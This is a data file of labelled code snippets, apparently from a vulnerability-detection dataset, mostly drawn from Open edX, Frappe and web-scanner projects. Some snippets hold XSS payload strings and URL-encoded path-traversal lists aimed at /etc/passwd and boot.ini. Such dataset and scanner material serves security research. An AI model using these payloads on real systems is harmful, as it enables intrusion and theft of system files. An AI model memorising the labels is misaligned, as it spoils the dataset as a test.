value: \t\t\t\tvalue[\"doctype", "label": 0}, {"snippet_id": 12684, "code": "=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/submission_history/(?P<student_username>[^/]*)/(?P<location>.*?)$', 'courseware.views.submission_history', name='submission_history'), ) if settings.ENABLE_JASMINE", "label": 0}, {"snippet_id": 15105, "code": ".gz -C{dir}'.format(dir=suite.imports_dir)), ]) def test_generate_html_reports(self): suite=Pa11yCrawler('') suite.generate_html_reports() self._mock_sh.assert_has_calls([ call( 'pa11ycrawler json-to-html", "label": 0}, {"snippet_id": 26371, "code": ")) except vat_moss.errors.WebServiceError: logger.exception('VAT ID checking failed for country{}'.format(data.get('country'))) self.instance.vat_id_validated=False if self.request and self.vat_warning", "label": 0}, {"snippet_id": 21568, "code": "'staff_grading_get_problem_list'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_problems$', 'open_ended_grading.views.student_problem_list', name='open_ended_problems'), url(r'^courses/(?P<course_id>[^/]+", "label": 0}, {"snippet_id": 54295, "code": " POST\", \"GET\", \"POST\"]) global timeout timeout=ttk.Combobox(main, values=range(1,61)) timeout.current(14) global user_agent user_agent=ttk.Combobox(main, values=ua) user_agent.current(1) global payload", "label": 0}, {"snippet_id": 665, "code": ": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers,\"res_body\": xss_request.text} dbupdate.insert_record(attack_result) return def xss_get_uri(url,method,headers,body,scanid", "label": 1}, {"snippet_id": 18594, "code": "'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/add$', 'course_groups.views.add_cohort', name=\"add_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)$', 'course_groups", "label": 0}, {"snippet_id": 3785, "code": ", \"POST\", headers, temp_body) decoded_payload=xss_payload_decode(payload) if xss_post_request.text.find(decoded_payload) !=-1: impact=check_xss_impact(xss_post_request.headers) if db_update is not True", "label": 0}, {"snippet_id": 10511, "code": " test_default(self): suite=Pa11yCrawler('') self.assertEqual( suite.cmd, self._expected_command(suite.pa11y_report_dir, suite.start_urls) ) def test_get_test_course(self): suite=Pa11yCrawler('') suite.get_test_course", "label": 0}, {"snippet_id": 23525, "code": "(?P<reload_dir>[^/]+)/(?P<commit_id>[^/]+)$', 'lms_migration.migrate.manage_modulestores'), url(r'^gitreload$', 'lms_migration.migrate.gitreload'), url(r'^gitreload/(?P<reload_dir>[^/]+)$', 'lms_migration", "label": 0}, {"snippet_id": 672, "code": ":body, \"res_headers\": xss_request.headers,\"res_body\": xss_request.text} dbupdate.insert_record(attack_result) return def xss_get_uri(url,method,headers,body,scanid=None): db_update='' vul_param='' url_query", "label": 1}, {"snippet_id": 28487, "code": " \tif kwargs.get('alerting')==1: \t\tmess=get_data('date_in_log') +action +\"\\n\" \t\tlog=open(log_path +\"/checker-\"+get_data('logs')+\".log\", \"a\") \telif kwargs.get('metrics')==1: \t\tmess=get_data('date_in_log'", "label": 0}, {"snippet_id": 2058, "code": ".api_request(url, \"GET\", temp_headers) decoded_payload=xss_payload_decode(payload) if ref_header_xss.text.find(decoded_payload) !=-1: print ref_header_xss.text impact=check_xss_impact(temp_headers) print", "label": 0}, {"snippet_id": 24938, "code": "*args, **kwargs): super(Pa11yCrawler, self).__init__(*args, **kwargs) self.course_key=kwargs.get('course_key') if self.imports_dir: self.should_fetch_course=False else: self.should_fetch_course=kwargs.get", "label": 0}, {"snippet_id": 45119, "code": "'coordinator2')] return render('editor/list_editor_coordinators.mako', request,{ 'coordinators': coordinators }) @check_document_access_permission() def edit_coordinator(request): coordinator_id=request", "label": 0}, {"snippet_id": 2683, "code": " temp_headers.update(referer_header) ref_header_xss=req.api_request(url, \"GET\", temp_headers) decoded_payload=xss_payload_decode(payload) if ref_header_xss.text.find(decoded_payload) !=-1: print ref_header_xss", "label": 0}, {"snippet_id": 5878, "code": " % s @classmethod def acmehttp01(cls, url): return url +'/.well-known/acme-challenge/?<h1>hi' def img(self, payload): return '<img/onerror=\"%s\"/src=x>' % payload def svg(self, payload): return '<svg/onload", "label": 1}, {"snippet_id": 5692, "code": "=//t.cn/><script src=/>', '<object//data=//t.cn>', '<s=\" onclick=confirm``>clickme', '<svG oNLoad=co\\u006efirm& '\\'\"><y///oNMousEDown=((confirm))()>Click', '<a/href=javascript&colon;co\\u006efirm& '<img", "label": 0}, {"snippet_id": 8394, "code": ", include('edinsights.core.urls')), ) import edinsights.core.registry urlpatterns +=( url(r'^comm/foldit_ops', 'foldit.views.foldit_ops', name=\"foldit_ops\"), ) if settings.MITX_FEATURES.get('ENABLE_DEBUG_RUN_PYTHON", "label": 0}, {"snippet_id": 26516, "code": "%2fpasswd', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e", "label": 0}, {"snippet_id": 8702, "code": "\"static_university_profile\", kwargs={'org_id': 'McGillX'}), url(r'^(?i)university_profile/TorontoX$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'TorontoX'}), url(r'^", "label": 0}, {"snippet_id": 10327, "code": " means specific xunit, coloring, and process-related settings should be used. \"\"\" process_count=2 expected_verbosity_string=( \"--with-xunitmp --xunitmp-file={repo_dir}/reports/bok_choy{shard_str}/xunit", "label": 0}, {"snippet_id": 12614, "code": "(?P<course_id>[^/]+/[^/]+/[^/]+)/notes/', include('notes.urls')), ) if settings.MITX_FEATURES.get('ENABLE_MASQUERADE'): urlpatterns +=( url(r'^masquerade/(?P<marg>.*)$', 'courseware.masquerade.handle_ajax", "label": 0}, {"snippet_id": 9873, "code": "), ) if settings.MITX_FEATURES.get('ENABLE_SQL_TRACKING_LOGS'): urlpatterns +=( url(r'^event_logs$', 'track.views.view_tracking_log'), url(r'^event_logs/(?P<args>.+)$', 'track.views.view_tracking_log')", "label": 0}, {"snippet_id": 4378, "code": "%s\"/>' % payload def style(self, payload): return '<style/onload=\"%s\"></style>' % payload def input(self, payload): return '<input/onfocus=\"%s\"/autofocus>' % payload def marquee(self, payload): return ", "label": 0}, {"snippet_id": 41354, "code": ") or route def get_blog_list(doctype, txt=None, filters=None, limit_start=0, limit_page_length=20, order_by=None): \tconditions=[] \tif filters: \t\tif filters.blogger: \t\t\tconditions.append('t1.blogger=\"%s", "label": 0}, {"snippet_id": 33157, "code": " class CronUpdateBuckets(webapp2.RequestHandler): \"\"\"Updates buckets from configs.\"\"\" @decorators.require_cronjob def get(self): config.cron_update_buckets() class BuildRPCHandler(webapp2.RequestHandler):", "label": 0}, {"snippet_id": 39395, "code": "\t\t\telse: \t\t\t\t\traise \t\t\telse: \t\t\t\traise \t\tself.set(\"__islocal\", False) \tdef db_update(self): \t\tif self.get(\"__islocal\") or not self.name: \t\t\tself.db_insert() \t\t\treturn \t\td=self.get_valid_dict(convert_dates_to_str", "label": 0}, {"snippet_id": 15071, "code": ") self.assertEqual( suite.cmd, self._expected_command(suite.pa11y_report_dir, suite.start_urls) ) def test_get_test_course(self): suite=Pa11yCrawler('') suite.get_test_course() self._mock_sh.assert_has_calls", "label": 0}, {"snippet_id": 19677, "code": " running Bok Choy acceptance test suite \"\"\" from time import sleep from urllib import urlencode from common.test.acceptance.fixtures.course import CourseFixture, FixtureError from path import Path as path", "label": 0}, {"snippet_id": 28341, "code": " ConfigParser, ExtendedInterpolation \ttry: \t\tpath_config=get_app_dir()+\"/haproxy-wi.cfg\" \t\tconfig=ConfigParser(interpolation=ExtendedInterpolation()) \t\tconfig.read(path_config) \texcept: \t\tprint('Content", "label": 0}, {"snippet_id": 54744, "code": " Phone\", \"iPad\", \"iPod\"] for d in devices: if d in useragent: return True return False class ArticleFormView(LoginRequiredMixin, FormView): \"\"\"\u5904\u7406\u6dfb\u52a0 Article \u65f6\u7684\u8868\u5355\"\"\" model=Article template_name='post.html'", "label": 0}, {"snippet_id": 33801, "code": ".sub_title=_('Filtered by \"{0}\"').format(frappe.local.form_dict.txt) \tif list_context.sub_title: \t\tlist_context.parents=[{\"name\": _(\"Home\"), \"route\": \"/\"}, \t\t\t\t\t\t\t\t{\"name\": \"Blog\", \"route\": \"/blog\"}] \telse: ", "label": 1}, {"snippet_id": 26443, "code": "\"</title><script>alert(1);</script>\", \"<body background=\\\"javascript:alert(1)\\\">\", \"<img src=test123456.jpg onerror=alert(1)>\"] lfi_attacks=[ '../../etc/passwd', '../../../etc/passwd', '../../../../etc", "label": 0}, {"snippet_id": 38312, "code": "\t\t\t\tt1.content as content, \t\t\t\tifnull(t1.blog_intro, t1.content) as intro, \t\t\t\tt2.full_name, t2.avatar, t1.blogger, \t\t\t\t(select count(name) from `tabCommunication` \t\t\t\t\twhere \t\t\t\t\t\tcommunication_type='Comment", "label": 0}, {"snippet_id": 39193, "code": "\"__islocal\") \tdef as_dict(self, no_nulls=False, no_default_fields=False, convert_dates_to_str=False): \t\tdoc=self.get_valid_dict(convert_dates_to_str=convert_dates_to_str) \t\tdoc[\"doctype\"]=self.doctype \t\tfor df", "label": 0}, {"snippet_id": 36959, "code": "\t\twhere published=1 \t\tand exists(select name from `tabBlog Post` \t\t\twhere `tabBlog Post`.blog_category=`tabBlog Category`.name and published=1) \t\torder by title asc\"\"\", as_dict=1) def clear_blog_cache(", "label": 0}, {"snippet_id": 46832, "code": " content=kwargs.pop('content', None) if content is not None: await self.set_content(content) return await super().save(*args, **kwargs) @property async def content(self): rv=await self.get_props_by_key", "label": 0}, {"snippet_id": 5696, "code": "/data=//t.cn>', '<s=\" onclick=confirm``>clickme', '<svG oNLoad=co\\u006efirm& '\\'\"><y///oNMousEDown=((confirm))()>Click', '<a/href=javascript&colon;co\\u006efirm& '<img src=x onerror=confir\\u006d`1`>', '<svg", "label": 0}, {"snippet_id": 4868, "code": "\" content=\"0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K\">\"\"\", \"\"\"<head><meta http-equiv=\"content-type\" content=\"text/html; charset=utf-7\"> </head>+ADw-SCRIPT+AD4-alert('XSS');+ADw", "label": 1}, {"snippet_id": 36672, "code": ".published_on: \t\t\tself.published_on=today() \t\t \t\tfrappe.db.sql(\"\"\"update tabBlogger set posts=(select count(*) from `tabBlog Post` \t\t\twhere ifnull(blogger,'')=tabBlogger.name) \t\t\twhere name=%s\"\"\",(self.blogger,)", "label": 0}, {"snippet_id": 6233, "code": " not res: res=None return res @property def logfile(self): \"\"\" Path to application logfile. Something like '/var/log/idp/eduid_idp.log' maybe. \"\"\" res=self.config.get(self.section, 'logfile') if not res", "label": 0}, {"snippet_id": 27518, "code": "({'dest': dest_url}) def make_logout_url(dest_url): \"\"\"Make the switch account url.\"\"\" return '/logout?' +urllib.parse.urlencode({ 'csrf_token': form.generate_csrf_token(), 'dest': dest_url, }) class _MenuItem", "label": 0}, {"snippet_id": 16102, "code": "(r'^email_confirm/(?P<key>[^/]*)$', 'student.views.confirm_email_change'), url(r'^change_name$', 'student.views.change_name_request', name=\"change_name\"), url(r'^accept_name_change$', 'student.views.accept_name_change", "label": 0}, {"snippet_id": 10588, "code": " BuildFailure from pavelib.utils.test.suites.suite import TestSuite from pavelib.utils.envs import Env from pavelib.utils.test import bokchoy_utils from pavelib.utils.test import utils as test_utils import os try", "label": 0}, {"snippet_id": 41204, "code": ".category \tif category: \t\tcategory_title=get_blog_category(category) \t\tlist_context.sub_title=_(\"Posts filed under{0}\").format(category_title) \t\tlist_context.title=category_title \telif frappe.local.form_dict", "label": 1}, {"snippet_id": 46481, "code": "): return render('no_collections.mako', request,{'is_embeddable': request.GET.get('is_embeddable', False)}) def admin_collections(request, is_redirect=False, is_mobile=False): existing_hue_collections=DashboardController", "label": 0}, {"snippet_id": 24895, "code": "\"SELENIUM_DRIVER_LOG_DIR='{}'\".format(self.log_dir), \"VERIFY_XSS='{}'\".format(self.verify_xss), \"nosetests\", test_spec, \"{}\".format(self.verbosity_processes_string()) ] if self.pdb: cmd.append(\"--pdb\") if self", "label": 0}, {"snippet_id": 22305, "code": " name='auth_password_change'), url(r'^password_change_done/$', django.contrib.auth.views.password_change_done, name='auth_password_change_done'), url(r'^password_reset_confirm/(?P<uidb36>[0-9A-Za-z]+)-", "label": 0}, {"snippet_id": 9379, "code": "'staff_grading'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_next$', 'open_ended_grading.staff_grading_service.get_next', name='staff_grading_get_next'), url(r'^courses/(?P<course_id>[^/]+/", "label": 0}, {"snippet_id": 32729, "code": " _DoRawSourceFile(self, full_path): self._WriteHeader('text/html') self._WriteTemplate('header.html') self.wfile.write('<table class=\"FileContents\">') with open(full_path) as fp: data=fp.read().replace( '&", "label": 0}, {"snippet_id": 41547, "code": " from six import iteritems, string_types import datetime import frappe, sys from frappe import _ from frappe.utils import(cint, flt, now, cstr, strip_html, \tsanitize_html, sanitize_email, cast_fieldtype", "label": 0}, {"snippet_id": 11100, "code": ".imports_dir ) ) def load_data(self): \"\"\" Loads data into database from db_fixtures \"\"\" print 'Loading data from json fixtures in db_fixtures directory' sh( \"DEFAULT_STORE={default_store}\" \"./manage.py", "label": 0}, {"snippet_id": 746, "code": ",headers) print xss_request.text if xss_request.text.find(payload) !=-1: impact=check_xss_impact(xss_request.headers) logs.logging.info(\"%s is vulnerable to XSS\",url) print \"%s[{0}]{1} is vulnerable to", "label": 1}, {"snippet_id": 25441, "code": "'require_all_fields', False) kwargs['required']=False kwargs['widget']=(kwargs.get('widget') or self.widget)( scheme=self.scheme, field=self, **kwargs.pop('widget_kwargs',{}) ) defaults.update(**kwargs) for fname", "label": 0}, {"snippet_id": 32508, "code": "): def __init__(self, server_address, top_level): SocketServer.TCPServer.__init__(self, server_address, Handler) self.top_level=top_level def server_bind(self): self.socket.setsockopt(socket.SOL_SOCKET", "label": 0}, {"snippet_id": 32186, "code": " Git checkout.\"\"\" from __future__ import print_function import SimpleHTTPServer import SocketServer import argparse import codecs import os import re import socket import sys import threading import time", "label": 0}, {"snippet_id": 36438, "code": "\t\tself.set(df.fieldname, ref_doc.get(df.fieldname)) \tdef get_value(self, fieldname): \t\tdf=self.meta.get_field(fieldname) \t\tval=self.get(fieldname) \t\treturn self.cast(val, df) \tdef cast(self, value, df)", "label": 0}, {"snippet_id": 32110, "code": "\"identity\", \"identity:delete_mapping\"),) def delete(self, request, obj_id): api.keystone.mapping_delete(request, obj_id) class MappingFilterAction(tables.FilterAction): def filter(self, table, mappings,", "label": 0}, {"snippet_id": 11985, "code": " urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/jump_to/(?P<location>.*)$', 'courseware.views.jump_to', name=\"jump_to\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/modx/(?P<location>.*", "label": 0}, {"snippet_id": 36194, "code": " fieldname, doc=None, currency=None, absolute_value=False, translated=False): \t\tfrom frappe.utils.formatters import format_value \t\tdf=self.meta.get_field(fieldname) \t\tif not df and fieldname in default_fields", "label": 0}, {"snippet_id": 15514, "code": ".verbosity !=DEFAULT_VERBOSITY and self.num_processes !=DEFAULT_NUM_PROCESSES: msg='Cannot pass in both num_processors and verbosity. Quitting' raise BuildFailure(msg) if self.num_processes !=1: substring", "label": 0}, {"snippet_id": 36745, "code": " context.description, \t\t} \t\tif \"<!--markdown -->\" in context.content: \t\t\tcontext.content=markdown(context.content) \t\timage=find_first_image(self.content) \t\tif image: \t\t\tcontext.metatags[\"image\"]=image \t", "label": 0}, {"snippet_id": 835, "code": " utils.logger import logger from utils.db import Database_update from utils.config import get_value dbupdate=Database_update() api_logger=logger() def fetch_xss_payload(): payload_list=[] if os.getcwd()", "label": 0}, {"snippet_id": 9588, "code": "/]+)/notes/', include('notes.urls')), ) if settings.MITX_FEATURES.get('ENABLE_MASQUERADE'): urlpatterns +=( url(r'^masquerade/(?P<marg>.*)$', 'courseware.masquerade.handle_ajax', name=\"masquerade-switch", "label": 0}, {"snippet_id": 1121, "code": "=key else: result=True if vul_param=='': vul_param +=key else: vul_param +=','+key except: logs.logging.info(\"XSS: No GET param found!\") print \"all params\",vul_param def xss_check(url,method,headers,body", "label": 1}, {"snippet_id": 4988, "code": "=confirm``>clickme', '<svG oNLoad=co\\u006efirm& '\\'\"><y///oNMousEDown=((confirm))()>Click', '<a/href=javascript&colon;co\\u006efirm& '<img src=x onerror=confir\\u006d`1`>', '<svg/onload=co\\u006efir\\u006d`1`>', '", "label": 0}, {"snippet_id": 54155, "code": ") main=Tk() main.title(\"XSS Sonar\") main.configure(background='light sky blue') Label(main, text=\"Target:\",background='light sky blue').grid(row=0) Label(main, text=\"Cookie:(Optional)\",background='light", "label": 0}, {"snippet_id": 25290, "code": "=value.get('_legacy', '') return data def render(self, name: str, value, attrs=None, renderer=None) -> str: if not isinstance(value, list): value=self.decompress(value) output=[] final_attrs=self.build_attrs", "label": 0}, {"snippet_id": 3766, "code": " key,value in body.items(): xss_payloads=fetch_xss_payload() for payload in xss_payloads: temp_body.update(body) temp_body[key]=payload print \"updated body\",temp_body xss_post_request=req.api_request(url,", "label": 0}, {"snippet_id": 29721, "code": " \t\tif line !=\"\": \t\t\tback=json.dumps(line).split(\"\\\"\") \t\t\tif kwargs.get('ret'): \t\t\t\tret +=back[1] \t\t\t\tret +=\"<br />\" \t\t\telse: \t\t\t\tprint(back[1], end=\"<br>\") \t\t \tif kwargs.get('ret'): \t\treturn ret \t\t def", "label": 0}, {"snippet_id": 42776, "code": ".append((fieldname, get_msg(frappe._dict(label=fieldname)))) \t\treturn missing \tdef get_invalid_links(self, is_submittable=False): \t\t'''Returns list of invalid links and also updates fetch values if not set", "label": 0}, {"snippet_id": 55076, "code": ".cleaned_data['locale']) entities=Entity.objects.filter(pk__in=form.cleaned_data['entities']) if not entities.exists(): return JsonResponse({'count': 0}) projects_pk=entities.values_list('resource__project__pk',", "label": 0}, {"snippet_id": 51051, "code": " return cleaned_data class IEPeriodicTaskAdmin(PeriodicTaskAdmin, ImportExportModelAdmin): list_display=('name_safe', 'enabled', 'interval', 'crontab', 'next', 'due', 'precise', 'last_run_at', 'queue', ", "label": 0}, {"snippet_id": 14553, "code": ".easy import BuildFailure from pavelib.utils.test.suites import BokChoyTestSuite, Pa11yCrawler REPO_DIR=os.getcwd() class TestPaverBokChoyCmd(unittest.TestCase): \"\"\" Paver Bok Choy Command test cases \"\"", "label": 0}, {"snippet_id": 34392, "code": ".__dict__.get(key, default) \t\t\telse: \t\t\t\tvalue=self.__dict__.get(key, default) \t\t\tif value is None and key not in self.ignore_in_getter \\ \t\t\t\tand key in(d.fieldname for d in self.meta.get_table_fields(", "label": 0}, {"snippet_id": 55102, "code": "=projects_pk.distinct()) for project in projects: if( not request.user.can_translate(project=project, locale=locale) or readonly_exists(projects, locale) ): return HttpResponseForbidden( \"Forbidden: You", "label": 0}, {"snippet_id": 779, "code": "\"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers,\"res_body\": xss_request.text} dbupdate.insert_record(attack_result) result", "label": 0}, {"snippet_id": 3417, "code": " True: decoded_payload=xss_payload_decode(payload) if xss_request_url.text.find(decoded_payload) !=-1: impact=check_xss_impact(xss_request_url.headers) attack_result={ \"id\": 11, \"scanid\": scanid, \"url\"", "label": 0}, {"snippet_id": 32007, "code": "\tattributes=[ldap_search_field] \t\tresult=l.search_s(ldap_base, ldap.SCOPE_SUBTREE, criteria, attributes) \t\tresults=[entry for dn, entry in result if isinstance(entry, dict)] \t\ttry: \t\t\tprint('[\"'+results[0]", "label": 0}, {"snippet_id": 27463, "code": "(os.path.dirname(__file__), '..', 'templates')), extensions=['jinja2.ext.autoescape'], autoescape=True) _MENU_ITEMS=[] add_jinja2_filter('json', encode_json) add_jinja2_filter('format_time', format_time", "label": 0}, {"snippet_id": 44138, "code": ".faceted_search(query=query, user='') results=page_search.execute() expected=\"\"\" &lt;h3&gt;<em>XSS</em> exploit&lt;& \"\"\".strip() hits=results.hits.hits assert len(hits)==1 inner_hits=hits[0]['inner_hits']", "label": 1}, {"snippet_id": 31031, "code": " \tos.system(\"cp scripts/%s.\" % script) \t\t \terror=str(funct.upload(master, tmp_config_path, script)) \tif error: \t\tprint('error: '+error) \t\tsys.exit() \tfunct.upload(slave, tmp_config_path, script) \tfunct", "label": 0}, {"snippet_id": 26141, "code": " max_length=255, required=event.settings.invoice_name_required and not self.all_optional, scheme=event.settings.name_scheme, label=_('Name'), initial=(self.instance.name_parts if self.instance else self", "label": 0}, {"snippet_id": 238, "code": ", \"req_body\":body, \"res_headers\": xss_request.headers,\"res_body\": xss_request.text} dbupdate.insert_record(attack_result) except: logs.logging.info(\"XSS: No GET param found!\") def xss_check(url,method,headers", "label": 0}, {"snippet_id": 5568, "code": "-equiv=\"refresh\" content=\"0;url=javascript:alert('xss');\">\"\"\", \"\"\"<meta http-equiv=\"refresh\" content=\"0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K\">\"\"\", \"\"\"<head><meta http-equiv", "label": 0}, {"snippet_id": 50922, "code": " django.contrib import admin from django.contrib.auth.admin import GroupAdmin as BaseGroupAdmin from django.contrib.auth.admin import UserAdmin as BaseUserAdmin from django.contrib.auth.models import Group,", "label": 0}, {"snippet_id": 3725, "code": "=-1 or res_headers['Content-Type'].find('text/plain') !=-1: impact=\"Low\" else: impact=\"High\" else: impact=\"Low\" return impact def xss_payload_decode(payload): decoded_payload=urllib.unquote(payload).decode", "label": 0}, {"snippet_id": 15659, "code": ") def load_data(self): \"\"\" Loads data into database from db_fixtures \"\"\" print 'Loading data from json fixtures in db_fixtures directory' sh( \"DEFAULT_STORE={default_store}\" \"./manage.py lms --settings", "label": 0}, {"snippet_id": 10577, "code": " import CourseFixture, FixtureError from path import Path as path from paver.easy import sh, BuildFailure from pavelib.utils.test.suites.suite import TestSuite from pavelib.utils.envs import Env from pavelib", "label": 0}, {"snippet_id": 8819, "code": "\"), url(r'^help$', 'static_template_view.views.render', {'template': 'help.html'}, name=\"help_edx\"), url(r'^press/([_a-zA-Z0-9-]+)$', 'static_template_view.views.render_press_release', name='press_release", "label": 0}, {"snippet_id": 32479, "code": " makes little sense to have the separator charactor configurable. \"\"\" value=value.encode('ascii', 'replace') value=re.sub(r'[^-a-zA-Z0-9]', '_', value) value=value.replace(u' ', u'-') value=re.sub(r'([-_", "label": 0}, {"snippet_id": 47658, "code": " stehen\")) if profile: f.add_content(PlainText('<br /><br />Change password(leave blank in order to not change it):')) else: f.add_content(PlainText('<br />Choose a password: ')) f.add_content(PasswordField", "label": 0}, {"snippet_id": 23827, "code": ")) def test_testcase_spec(self): spec='test_foo.py:FooTest.test_bar' suite=BokChoyTestSuite('', test_spec=spec) name='tests/{}'.format(spec) self.assertEqual(suite.cmd, self._expected_command(name=name", "label": 0}, {"snippet_id": 23606, "code": "), ) if settings.MITX_FEATURES.get('ENABLE_DEBUG_RUN_PYTHON'): urlpatterns +=( url(r'^debug/run_python', 'debug.views.run_python'), ) if settings.MITX_FEATURES.get('ENABLE_HINTER_INSTRUCTOR_VIEW'): urlpatterns", "label": 0}, {"snippet_id": 31763, "code": "'group')+\"/\"+form.getvalue('color')+\"/\"+list_name \ttry: \t\topen(list, 'a').close() \t\tprint('<div class=\"alert alert-success\" style=\"margin:0\">'+form.getvalue('color')+' list was created</div>') \texcept IOError", "label": 0}, {"snippet_id": 43003, "code": " docname, get_msg(df, docname))) \t\treturn invalid_links, cancelled_links \tdef _validate_selects(self): \t\tif frappe.flags.in_import: \t\t\treturn \t\tfor df in self.meta.get_select_fields(): \t\t\tif df.fieldname", "label": 0}, {"snippet_id": 1720, "code": "'], 'res_headers': data['res_headers'], 'res_body': data['res_body'], 'Description': vul['Description'], 'remediation': vul['remediation'] } vul_list.append(all_data) break except: pass print vul_list return", "label": 0}, {"snippet_id": 16901, "code": "', 'courseware.views.progress', name=\"progress\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress/(?P<student_id>[^/]*)/$', 'courseware.views.progress', name=\"student_progress\"), url(r'^courses", "label": 0}, {"snippet_id": 20667, "code": "', 'student.views.change_name_request', name=\"change_name\"), url(r'^accept_name_change$', 'student.views.accept_name_change'), url(r'^reject_name_change$', 'student.views.reject_name_change'), url(r'^pending_name_changes$", "label": 0}, {"snippet_id": 12906, "code": ".MITX_FEATURES.get('ENABLE_SQL_TRACKING_LOGS'): urlpatterns +=( url(r'^event_logs$', 'track.views.view_tracking_log'), url(r'^event_logs/(?P<args>.+)$', 'track.views.view_tracking_log'), ) if settings.MITX_FEATURES", "label": 0}, {"snippet_id": 14800, "code": ".set('VERIFY_XSS', 'True') with self.env_var_override: suite=BokChoyTestSuite('') name='tests' self.assertEqual(suite.cmd, self._expected_command(name=name, verify_xss=True)) def test_test_dir(self): test_dir", "label": 1}, {"snippet_id": 50419, "code": " ready to receive data as soon as it is available. This is the basis of a long-polling(comet) mechanism: the server will wait to reply until data is available. Args: request(Request): Incoming request.", "label": 0}, {"snippet_id": 20706, "code": "/login$', 'student.views.accounts_login', name=\"accounts_login\"), url(r'^login_ajax$', 'student.views.login_user', name=\"login\"), url(r'^login_ajax/(?P<error>[^/]*)$', 'student.views.login_user'), url(r", "label": 0}, {"snippet_id": 54378, "code": "(width=30) payload.grid(row=5, column=1) payload.config(width=30) proxy.grid(row=6, column=1) proxy.current(0) proxy.config(width=30) refresh.grid(row=7, column=1) refresh.current(1) refresh.config(width", "label": 0}, {"snippet_id": 26717, "code": "%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini", "label": 0}, {"snippet_id": 44162, "code": "(domain_hits)==0 section_hits=inner_hits['sections']['hits']['hits'] assert len(section_hits)==1 section_content_highlight=section_hits[0]['highlight']['sections.content'] assert len(section_content_highlight", "label": 0}, {"snippet_id": 39333, "code": " `tab{doctype}` \t\t\t\t({columns}) values({values})\"\"\".format( \t\t\t\t\tdoctype=self.doctype, \t\t\t\t\tcolumns=\", \".join([\"`\"+c+\"`\" for c in columns]), \t\t\t\t\tvalues=\", \".join([\"%s\"] * len(columns)) \t\t\t\t), list(d.values", "label": 0}, {"snippet_id": 31709, "code": "+form.getvalue('group')+\"/\"+form.getvalue('color')+\"/\"+form.getvalue('bwlists') \ttry: \t\tfile=open(list, \"r\") \t\tfile_read=file.read() \t\tfile.close \t\tprint(file_read) \texcept IOError: \t\tprint('<div class", "label": 0}, {"snippet_id": 30026, "code": " +'.pem' \t \ttry: \t\twith open(name, \"w\") as ssl_cert: \t\t\tssl_cert.write(form.getvalue('ssl_cert')) \texcept IOError: \t\tprint('<div class=\"alert alert-danger\">Can\\'t save ssl keys file. Check ssh keys path", "label": 0}, {"snippet_id": 49971, "code": " from twisted.web import server, resource from twisted.internet.task import LoopingCall from django.utils.functional import Promise from django.utils.encoding import force_unicode from django.conf import", "label": 0}, {"snippet_id": 43700, "code": ") or self \t\treturn format_value(val, df=df, doc=doc, currency=currency) \tdef is_print_hide(self, fieldname, df=None, for_print=True): \t\t\"\"\"Returns true if fieldname is to be hidden for print. \t\tPrint Hide", "label": 0}, {"snippet_id": 22020, "code": ".MITX_FEATURES.get('ENABLE_SQL_TRACKING_LOGS'): urlpatterns +=( url(r'^event_logs$', 'track.views.view_tracking_log'), url(r'^event_logs/(?P<args>.+)$', 'track.views.view_tracking_log'), ) if settings.MITX_FEATURES", "label": 0}, {"snippet_id": 41766, "code": " \t\tif isinstance(d, BaseDocument): \t\t\td=d.get_valid_dict() \t\tif \"doctype\" in d: \t\t\tself.set(\"doctype\", d.get(\"doctype\")) \t\tfor key, value in iteritems(d): \t\t\t \t\t\tif(self.get(key) is None) and(value is not", "label": 0}, {"snippet_id": 47550, "code": ": ')) f.add_content(NumberField(name='allowed_reservations', button_text=str(profile.number_of_allowed_reservations), minimum=0)) f.add_content(PlainText(\"Rights: \")) f.add_content(NumberField(name=\"rights", "label": 0}, {"snippet_id": 15678, "code": " loaddata --traceback\" \" common/test/db_fixtures/*.json\".format( default_store=self.default_store, ) ) def run_servers_continuously(self): \"\"\" Infinite loop. Servers will continue to run in the current session", "label": 0}, {"snippet_id": 29837, "code": " |grep pem\"] \ttry: \t\tfunct.ssh_command(serv, commands, ip=\"1\") \texcept: \t\tprint('<div class=\"alert alert-danger\" style=\"margin:0\">Can not connect to the server</div>') if form.getvalue('checkSshConnect')", "label": 0}, {"snippet_id": 45573, "code": ".objects.get_docs(request.user, Document2, extra='coordinator2')] return render('editor/bundle_editor.mako', request,{ 'bundle_json': bundle.json, 'coordinators_json': json.dumps(coordinators), 'doc1_id", "label": 1}, {"snippet_id": 1194, "code": " scanid=hashlib.md5(str(time.time())).hexdigest() return scanid @app.route('/scan/', methods=['POST']) def start_scan(): scanid=generate_hash() content=request.get_json() try: name=content['appname'] url", "label": 0}, {"snippet_id": 44927, "code": ", e: response['message']=str(e) return HttpResponse(json.dumps(response), mimetype=\"application/json\") @check_document_access_permission() def submit_workflow(request, doc_id): workflow=Workflow(document", "label": 0}, {"snippet_id": 13613, "code": "<course_id>[^/]+/[^/]+/[^/]+)/mktg-about$', 